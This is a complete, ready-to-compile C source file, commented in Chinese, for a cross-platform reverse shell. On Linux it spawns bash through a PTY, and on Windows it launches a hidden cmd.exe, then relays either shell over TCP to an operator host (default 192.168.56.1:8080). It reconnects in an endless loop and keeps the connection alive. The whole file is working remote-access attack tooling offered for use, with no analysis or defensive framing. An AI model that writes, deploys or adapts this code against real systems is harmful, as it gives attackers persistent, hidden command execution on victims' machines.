/*
 * reverse.c —— 跨平台反弹交互式 Shell 样本（C99，单文件）
 *
 * 用法：
 *   reverse [HOST] [PORT]          位置参数优先于环境变量
 *
 * 环境变量：
 *   RS_HOST       目标地址        默认 192.168.56.1
 *   RS_PORT       目标端口        默认 8080
 *   RS_INTERVAL   断线重连间隔秒  默认 5
 *   RS_SHELL      shell 路径      Linux 默认 /bin/bash，Windows 默认 cmd.exe
 *   RS_SESSIONS   最多会话数      0 或未设 = 无限，到数后退出 0
 *   RS_ONCE=1     等价 RS_SESSIONS=1
 *   RS_NO_CHCP=1  Windows 下不发送 chcp 行
 *
 * Linux  ：forkpty 真 PTY + poll 双向转发（Ctrl-C / TTY 语义 / 窗口尺寸完整）
 * Windows：隐藏 cmd.exe + 两条匿名管道 + 双线程转发
 * 诊断信息只走 stderr，前缀 [reverse] ；stdout 保持干净。
 */
#define _GNU_SOURCE

#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#  define WIN32_LEAN_AND_MEAN
#  include <winsock2.h>
#  include <ws2tcpip.h>
#  include <mstcpip.h>
#  include <windows.h>
#  include <process.h>
#else
#  include <errno.h>
#  include <fcntl.h>
#  include <netdb.h>
#  include <netinet/in.h>
#  include <netinet/tcp.h>
#  include <poll.h>
#  include <pty.h>
#  include <signal.h>
#  include <sys/socket.h>
#  include <sys/wait.h>
#  include <time.h>
#  include <unistd.h>
#endif

#define RS_HOST_DEFAULT     "192.168.56.1"
#define RS_PORT_DEFAULT     8080
#define RS_INTERVAL_DEFAULT 5
#define RS_CONNECT_TIMEOUT  10        /* 秒，绝不允许无限挂起 */
#define RS_PTY_COLS         120
#define RS_PTY_ROWS         30
#define RS_BUF              (8 * 1024)
#define RS_TERM_FALLBACK    "xterm-256color"

#ifdef _WIN32
#  define RS_SHELL_DEFAULT  "cmd.exe"
#else
#  define RS_SHELL_DEFAULT  "/bin/bash"
#endif

typedef struct {
    const char *host;
    int         port;
    int         interval;      /* 断线重连间隔（秒） */
    const char *shell;
    int         max_sessions;  /* 0 = 无限 */
    int         no_chcp;       /* Windows：不发送 chcp 行 */
} rs_config;

/* ============================ 通用 ============================ */

static void rs_log(const char *fmt, ...)
{
    va_list ap;

    fputs("[reverse] ", stderr);
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fputc('\n', stderr);
    fflush(stderr);
}

static const char *rs_env(const char *key)
{
    const char *v = getenv(key);
    return (v != NULL && *v != '\0') ? v : NULL;
}

/* 未设 / 空 / "0" 视为关闭，其余视为开启 */
static int rs_flag(const char *key)
{
    const char *v = rs_env(key);
    if (v == NULL) return 0;
    return strcmp(v, "0") != 0;
}

static int rs_sessions_done(const rs_config *cfg, int sessions)
{
    return cfg->max_sessions > 0 && sessions >= cfg->max_sessions;
}

/* 默认值 -> 环境变量 -> 位置参数，后面的覆盖前面的 */
static void rs_config_init(rs_config *cfg, int argc, char **argv)
{
    const char *v;

    cfg->host         = RS_HOST_DEFAULT;
    cfg->port         = RS_PORT_DEFAULT;
    cfg->interval     = RS_INTERVAL_DEFAULT;
    cfg->shell        = RS_SHELL_DEFAULT;
    cfg->max_sessions = 0;
    cfg->no_chcp      = 0;

    if ((v = rs_env("RS_HOST")) != NULL)     cfg->host = v;
    if ((v = rs_env("RS_PORT")) != NULL)     cfg->port = atoi(v);
    if ((v = rs_env("RS_INTERVAL")) != NULL) cfg->interval = atoi(v);
    if ((v = rs_env("RS_SHELL")) != NULL)    cfg->shell = v;
    if ((v = rs_env("RS_SESSIONS")) != NULL) cfg->max_sessions = atoi(v);
    if (rs_flag("RS_ONCE"))    cfg->max_sessions = 1;
    if (rs_flag("RS_NO_CHCP")) cfg->no_chcp = 1;

    if (argc > 1 && argv[1][0] != '\0') {
        cfg->host = argv[1];
        if (argc > 2 && atoi(argv[2]) > 0) cfg->port = atoi(argv[2]);
    }

    if (cfg->port < 1 || cfg->port > 65535) {
        rs_log("端口非法（%d），回落到 %d", cfg->port, RS_PORT_DEFAULT);
        cfg->port = RS_PORT_DEFAULT;
    }
    if (cfg->interval < 0) cfg->interval = 0;
    if (cfg->max_sessions < 0) cfg->max_sessions = 0;
}

#ifndef _WIN32
/* ============================ Linux ============================ */

static void rs_sleep_ms(int ms)
{
    struct timespec ts;

    ts.tv_sec  = ms / 1000;
    ts.tv_nsec = (long)(ms % 1000) * 1000000L;
    while (nanosleep(&ts, &ts) < 0 && errno == EINTR) { }
}

static void rs_sleep_sec(int sec)
{
    if (sec > 0) rs_sleep_ms(sec * 1000);
}

/* 非阻塞 connect + select 超时；成功返回已恢复阻塞模式的 fd */
static int rs_connect(const char *host, int port)
{
    struct addrinfo hints, *res = NULL, *ai;
    char portstr[16];
    int fd = -1;

    memset(&hints, 0, sizeof hints);
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    snprintf(portstr, sizeof portstr, "%d", port);

    if (getaddrinfo(host, portstr, &hints, &res) != 0) {
        rs_log("解析 %s 失败", host);
        return -1;
    }

    for (ai = res; ai != NULL; ai = ai->ai_next) {
        int flags, rc, err = 0;
        socklen_t elen = sizeof err;
        fd_set wfds;
        struct timeval tv;

        fd = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (fd < 0) continue;

        flags = fcntl(fd, F_GETFL, 0);
        fcntl(fd, F_SETFL, flags | O_NONBLOCK);

        rc = connect(fd, ai->ai_addr, ai->ai_addrlen);
        if (rc != 0 && errno == EINPROGRESS) {
            FD_ZERO(&wfds);
            FD_SET(fd, &wfds);
            tv.tv_sec  = RS_CONNECT_TIMEOUT;
            tv.tv_usec = 0;
            rc = select(fd + 1, NULL, &wfds, NULL, &tv);
            if (rc > 0) {
                if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &elen) == 0 && err == 0)
                    rc = 0;
                else
                    rc = -1;
            } else {
                rc = -1;               /* 超时或被中断 */
            }
        }

        if (rc == 0) {
            fcntl(fd, F_SETFL, flags);  /* 转发阶段恢复阻塞，简化读写 */
            break;
        }

        close(fd);
        fd = -1;
    }

    freeaddrinfo(res);
    return fd;
}

/* TCP keepalive：15s 空闲 + 5s 间隔 × 3 次 ≈ 30s 发现半开连接 */
static void rs_set_keepalive(int fd)
{
    int on = 1, idle = 15, intvl = 5, cnt = 3;

    setsockopt(fd, SOL_SOCKET,  SO_KEEPALIVE, &on,    sizeof on);
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPIDLE,  &idle,  sizeof idle);
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, &intvl, sizeof intvl);
    setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT,   &cnt,   sizeof cnt);
}

/* from -> to 单向搬运；返回 0 表示对端关闭或出错 */
static int rs_pump(int from, int to)
{
    char buf[RS_BUF];
    ssize_t n;
    size_t off;

    n = read(from, buf, sizeof buf);
    if (n < 0) return (errno == EINTR || errno == EAGAIN) ? 1 : 0;
    if (n == 0) return 0;

    off = 0;
    while (off < (size_t)n) {
        ssize_t w = write(to, buf + off, (size_t)n - off);
        if (w > 0) {
            off += (size_t)w;
        } else if (w < 0 && errno == EINTR) {
            continue;
        } else {
            return 0;                  /* EPIPE / EIO：对端已死 */
        }
    }
    return 1;
}

/* 有界地把 PTY 残余输出抽干（子进程退出后调用） */
static void rs_drain(int master, int fd)
{
    char buf[RS_BUF];
    int i;

    for (i = 0; i < 64; i++) {
        struct pollfd pfd;
        ssize_t n;
        size_t off;

        pfd.fd = master;
        pfd.events = POLLIN;
        pfd.revents = 0;
        if (poll(&pfd, 1, 0) <= 0 || !(pfd.revents & POLLIN)) return;

        n = read(master, buf, sizeof buf);
        if (n <= 0) return;
        for (off = 0; off < (size_t)n; ) {
            ssize_t w = write(fd, buf + off, (size_t)n - off);
            if (w > 0) off += (size_t)w;
            else if (w < 0 && errno == EINTR) continue;
            else return;
        }
    }
}

/* 拆除会话：先 SIGHUP 整组，宽限后 SIGKILL，最后 waitpid 收尸 */
static void rs_kill_child(pid_t pid, int already_reaped)
{
    int st = 0, i;

    if (already_reaped) return;

    kill(-pid, SIGHUP);                /* forkpty 后子进程是新会话组长 */
    kill(pid, SIGHUP);
    for (i = 0; i < 30; i++) {         /* ~300ms 宽限 */
        if (waitpid(pid, &st, WNOHANG) == pid) return;
        rs_sleep_ms(10);
    }

    kill(-pid, SIGKILL);
    kill(pid, SIGKILL);
    for (i = 0; i < 200; i++) {        /* 再给 2 秒 */
        if (waitpid(pid, &st, WNOHANG) == pid) return;
        rs_sleep_ms(10);
    }
    waitpid(pid, &st, 0);              /* 兜底：绝不留僵尸 */
}

/* 建立一次会话并跑到底；返回 0 正常，-1 表示 PTY 创建失败 */
static int rs_session(int fd, const rs_config *cfg)
{
    struct winsize ws;
    int master = -1, reaped = 0, child_exited = 0;
    pid_t pid;

    if (getenv("TERM") == NULL) setenv("TERM", RS_TERM_FALLBACK, 0);

    memset(&ws, 0, sizeof ws);
    ws.ws_col = RS_PTY_COLS;
    ws.ws_row = RS_PTY_ROWS;

    pid = forkpty(&master, NULL, NULL, &ws);
    if (pid < 0) {
        rs_log("forkpty 失败: %s", strerror(errno));
        return -1;
    }

    if (pid == 0) {
        /* 子进程：exec 失败必须退出，绝不能回到父进程的重连循环 */
        signal(SIGPIPE, SIG_DFL);
        execl(cfg->shell, cfg->shell, "-i", (char *)NULL);
        execl("/bin/sh", "/bin/sh", "-i", (char *)NULL);
        _exit(127);
    }

    for (;;) {
        struct pollfd pfd[2];
        int rc;

        pfd[0].fd = fd;     pfd[0].events = POLLIN; pfd[0].revents = 0;
        pfd[1].fd = master; pfd[1].events = POLLIN; pfd[1].revents = 0;

        rc = poll(pfd, 2, 1000);        /* 1s 超时兜底轮询子进程状态 */
        if (rc < 0) {
            if (errno == EINTR) continue;
            rs_log("poll 失败: %s", strerror(errno));
            break;
        }

        /* 每次唤醒都检查子进程是否已退出 */
        if (!reaped && waitpid(pid, NULL, WNOHANG) == pid) {
            reaped = 1;
            child_exited = 1;
        }

        if (pfd[0].revents & POLLIN) {  /* 操作员 -> shell */
            if (!rs_pump(fd, master)) break;
        }
        if (pfd[0].revents & (POLLHUP | POLLERR | POLLNVAL)) break;

        if (pfd[1].revents & POLLIN) {  /* shell -> 操作员 */
            if (!rs_pump(master, fd)) { child_exited = 1; break; }
        }
        if (pfd[1].revents & (POLLHUP | POLLERR | POLLNVAL)) {
            child_exited = 1;
            break;
        }
        if (child_exited) break;
    }

    rs_drain(master, fd);               /* 尽量把残留输出吐给操作员 */
    rs_kill_child(pid, reaped);
    close(master);
    return 0;
}

int main(int argc, char **argv)
{
    rs_config cfg;
    int sessions = 0;

    signal(SIGPIPE, SIG_IGN);           /* 操作员断开时靠 write 返回 EPIPE 感知 */
    rs_config_init(&cfg, argc, argv);

    rs_log("目标 %s:%d  shell=%s  间隔=%ds  上限=%d",
           cfg.host, cfg.port, cfg.shell, cfg.interval, cfg.max_sessions);

    for (;;) {
        int fd;

        if (rs_sessions_done(&cfg, sessions)) {
            rs_log("达到会话上限 %d，退出", cfg.max_sessions);
            break;
        }

        fd = rs_connect(cfg.host, cfg.port);
        if (fd < 0) {
            rs_log("连接 %s:%d 失败，%d 秒后重试", cfg.host, cfg.port, cfg.interval);
            rs_sleep_sec(cfg.interval);
            continue;
        }

        rs_set_keepalive(fd);
        rs_log("已连接 %s:%d（第 %d 次会话）", cfg.host, cfg.port, sessions + 1);

        rs_session(fd, &cfg);
        sessions++;

        close(fd);                      /* 会话之间彻底释放资源 */
        rs_log("会话结束（累计 %d）", sessions);

        if (!rs_sessions_done(&cfg, sessions))
            rs_sleep_sec(cfg.interval);
    }

    return 0;
}

#else
/* ============================ Windows ============================ */

static unsigned __stdcall rs_thread_socket_to_child(void *arg);
static unsigned __stdcall rs_thread_child_to_socket(void *arg);

typedef struct {
    SOCKET      sock;
    HANDLE      child_stdin;    /* 我们持有的写端 */
    HANDLE      child_stdout;   /* 我们持有的读端 */
    HANDLE      process;        /* 子进程句柄，供线程触发拆除 */
    const rs_config *cfg;
} rs_win_ctx;

static void rs_sleep_sec(int sec)
{
    if (sec > 0) Sleep((DWORD)sec * 1000u);
}

/* 非阻塞 connect + select 超时；成功返回已恢复阻塞模式的 socket */
static SOCKET rs_connect(const char *host, int port)
{
    struct addrinfo hints, *res = NULL, *ai;
    char portstr[16];
    SOCKET s = INVALID_SOCKET;

    memset(&hints, 0, sizeof hints);
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    snprintf(portstr, sizeof portstr, "%d", port);

    if (getaddrinfo(host, portstr, &hints, &res) != 0) {
        rs_log("解析 %s 失败", host);
        return INVALID_SOCKET;
    }

    for (ai = res; ai != NULL; ai = ai->ai_next) {
        u_long nb = 1;
        int rc;

        s = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (s == INVALID_SOCKET) continue;

        ioctlsocket(s, FIONBIO, &nb);
        rc = connect(s, ai->ai_addr, (int)ai->ai_addrlen);
        if (rc == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK) {
            fd_set wfds, efds;
            struct timeval tv;
            int err = 0;

            FD_ZERO(&wfds);
            FD_ZERO(&efds);
            FD_SET(s, &wfds);
            FD_SET(s, &efds);
            tv.tv_sec  = RS_CONNECT_TIMEOUT;
            tv.tv_usec = 0;

            rc = select(0, NULL, &wfds, &efds, &tv);
            if (rc > 0 && FD_ISSET(s, &wfds)) {
                int elen = (int)sizeof err;
                if (getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&err, &elen) == 0 && err == 0)
                    rc = 0;
                else
                    rc = SOCKET_ERROR;
            } else {
                rc = SOCKET_ERROR;      /* 超时或连接被拒 */
            }
        }

        if (rc != SOCKET_ERROR) {
            nb = 0;
            ioctlsocket(s, FIONBIO, &nb);
            break;
        }

        closesocket(s);
        s = INVALID_SOCKET;
    }

    freeaddrinfo(res);
    return s;
}

/* keepalive 尽力而为：10s 空闲 + 3s 间隔（SIO_KEEPALIVE_VALS 失败的机器忽略） */
static void rs_set_keepalive(SOCKET s)
{
    struct tcp_keepalive vals;
    DWORD bytes = 0;
    BOOL  on = TRUE;

    setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, (const char *)&on, sizeof on);
    memset(&vals, 0, sizeof vals);
    vals.onoff             = 1;
    vals.keepalivetime     = 10000;
    vals.keepaliveinterval = 3000;
    WSAIoctl(s, SIO_KEEPALIVE_VALS, &vals, sizeof vals, NULL, 0, &bytes, NULL, NULL);
}

static int rs_write_all(HANDLE h, const char *buf, size_t len)
{
    size_t off = 0;

    while (off < len) {
        DWORD w = 0;
        if (!WriteFile(h, buf + off, (DWORD)(len - off), &w, NULL) || w == 0)
            return 0;
        off += (size_t)w;
    }
    return 1;
}

static int rs_send_all(SOCKET s, const char *buf, size_t len)
{
    size_t off = 0;

    while (off < len) {
        int n = send(s, buf + off, (int)(len - off), 0);
        if (n <= 0) return 0;
        off += (size_t)n;
    }
    return 1;
}

/* 线程 A：socket -> 子进程 stdin（剥离 '\r'，即 CRLF->LF 归一） */
static unsigned __stdcall rs_thread_socket_to_child(void *arg)
{
    rs_win_ctx *ctx = (rs_win_ctx *)arg;
    char buf[RS_BUF];

    if (!ctx->cfg->no_chcp) {           /* 首行切 UTF-8 代码页 */
        const char *init = "chcp 65001>nul\r\n";
        if (!rs_write_all(ctx->child_stdin, init, strlen(init))) {
            TerminateProcess(ctx->process, 1);
            return 0;
        }
    }

    for (;;) {
        int n = recv(ctx->sock, buf, (int)sizeof buf, 0);
        int i, w = 0;

        if (n <= 0) break;              /* 操作员断开或出错 */

        for (i = 0; i < n; i++)
            if (buf[i] != '\r') buf[w++] = buf[i];

        if (w > 0 && !rs_write_all(ctx->child_stdin, buf, (size_t)w)) break;
    }

    TerminateProcess(ctx->process, 1);  /* 触发主线程拆会话 */
    return 0;
}

/* 线程 B：子进程 stdout -> socket（原始字节，不做任何改写） */
static unsigned __stdcall rs_thread_child_to_socket(void *arg)
{
    rs_win_ctx *ctx = (rs_win_ctx *)arg;
    char buf[RS_BUF];

    for (;;) {
        DWORD n = 0;

        if (!ReadFile(ctx->child_stdout, buf, (DWORD)sizeof buf, &n, NULL) || n == 0)
            break;                      /* 子进程退出（管道破裂） */

        if (!rs_send_all(ctx->sock, buf, (size_t)n)) {
            TerminateProcess(ctx->process, 1);
            break;
        }
    }

    shutdown(ctx->sock, SD_SEND);       /* 让操作员看到 EOF */
    return 0;
}

/* 跑一次会话：隐藏启动子进程，双线程转发，子进程退出后彻底清理 */
static void rs_session(SOCKET sock, const rs_config *cfg)
{
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    HANDLE in_r = NULL, in_w = NULL, out_r = NULL, out_w = NULL;
    rs_win_ctx *ctx;
    uintptr_t th_reader = 0, th_writer = 0;
    char cmdline[1024];

    if (strlen(cfg->shell) + 2 >= sizeof cmdline) {   /* 防止命令行被静默截断 */
        rs_log("RS_SHELL 过长（%u 字节），跳过本次会话", (unsigned)strlen(cfg->shell));
        return;
    }

    memset(&sa, 0, sizeof sa);
    sa.nLength        = sizeof sa;
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&in_r, &in_w, &sa, 0)) {
        rs_log("CreatePipe(stdin) 失败: %lu", (unsigned long)GetLastError());
        return;
    }
    if (!CreatePipe(&out_r, &out_w, &sa, 0)) {
        rs_log("CreatePipe(stdout) 失败: %lu", (unsigned long)GetLastError());
        CloseHandle(in_r);
        CloseHandle(in_w);
        return;
    }
    /* 我们这端必须不可继承：否则子进程一直持有写端，EOF 检测失灵 */
    SetHandleInformation(in_w,  HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(out_r, HANDLE_FLAG_INHERIT, 0);

    snprintf(cmdline, sizeof cmdline, "\"%s\"", cfg->shell);

    memset(&si, 0, sizeof si);
    si.cb          = sizeof si;
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = in_r;
    si.hStdOutput  = out_w;
    si.hStdError   = out_w;             /* stderr 直接并到 stdout 的写端 */

    memset(&pi, 0, sizeof pi);
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        rs_log("CreateProcess 失败: %lu", (unsigned long)GetLastError());
        CloseHandle(in_r);
        CloseHandle(in_w);
        CloseHandle(out_r);
        CloseHandle(out_w);
        return;
    }
    CloseHandle(in_r);                  /* 子进程已继承，父进程不再持有子进程侧 */
    CloseHandle(out_w);
    in_r = out_w = NULL;

    ctx = (rs_win_ctx *)calloc(1, sizeof *ctx);
    if (ctx == NULL) {
        TerminateProcess(pi.hProcess, 1);
        WaitForSingleObject(pi.hProcess, 2000);
        CloseHandle(in_w);
        CloseHandle(out_r);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return;
    }
    ctx->sock         = sock;
    ctx->child_stdin  = in_w;
    ctx->child_stdout = out_r;
    ctx->process      = pi.hProcess;
    ctx->cfg          = cfg;

    th_reader = _beginthreadex(NULL, 0, rs_thread_socket_to_child, ctx, 0, NULL);
    th_writer = _beginthreadex(NULL, 0, rs_thread_child_to_socket, ctx, 0, NULL);

    WaitForSingleObject(pi.hProcess, INFINITE);   /* 会话终点：子进程退出 */

    shutdown(sock, SD_BOTH);            /* 唤醒可能阻塞在 socket 上的线程 */

    {
        int joined = 1;

        if (th_reader != 0) {
            if (WaitForSingleObject((HANDLE)th_reader, 2000) != WAIT_OBJECT_0) joined = 0;
            CloseHandle((HANDLE)th_reader);
        }
        if (th_writer != 0) {
            if (WaitForSingleObject((HANDLE)th_writer, 2000) != WAIT_OBJECT_0) joined = 0;
            CloseHandle((HANDLE)th_writer);
        }
        if (joined) free(ctx);          /* 线程未退出时宁可泄漏也不悬空 */
    }

    CloseHandle(in_w);
    CloseHandle(out_r);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    rs_log("子进程已退出，会话清理完成");
}

int main(int argc, char **argv)
{
    WSADATA wsa;
    rs_config cfg;
    int sessions = 0;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        rs_log("WSAStartup 失败");
        return 1;
    }

    rs_config_init(&cfg, argc, argv);
    rs_log("目标 %s:%d  shell=%s  间隔=%ds  上限=%d",
           cfg.host, cfg.port, cfg.shell, cfg.interval, cfg.max_sessions);

    for (;;) {
        SOCKET s;

        if (rs_sessions_done(&cfg, sessions)) {
            rs_log("达到会话上限 %d，退出", cfg.max_sessions);
            break;
        }

        s = rs_connect(cfg.host, cfg.port);
        if (s == INVALID_SOCKET) {
            rs_log("连接 %s:%d 失败，%d 秒后重试", cfg.host, cfg.port, cfg.interval);
            rs_sleep_sec(cfg.interval);
            continue;
        }

        rs_set_keepalive(s);
        rs_log("已连接 %s:%d（第 %d 次会话）", cfg.host, cfg.port, sessions + 1);

        rs_session(s, &cfg);
        sessions++;

        closesocket(s);                 /* 会话之间彻底释放资源 */
        rs_log("会话结束（累计 %d）", sessions);

        if (!rs_sessions_done(&cfg, sessions))
            rs_sleep_sec(cfg.interval);
    }

    WSACleanup();
    return 0;
}

#endif /* _WIN32 */
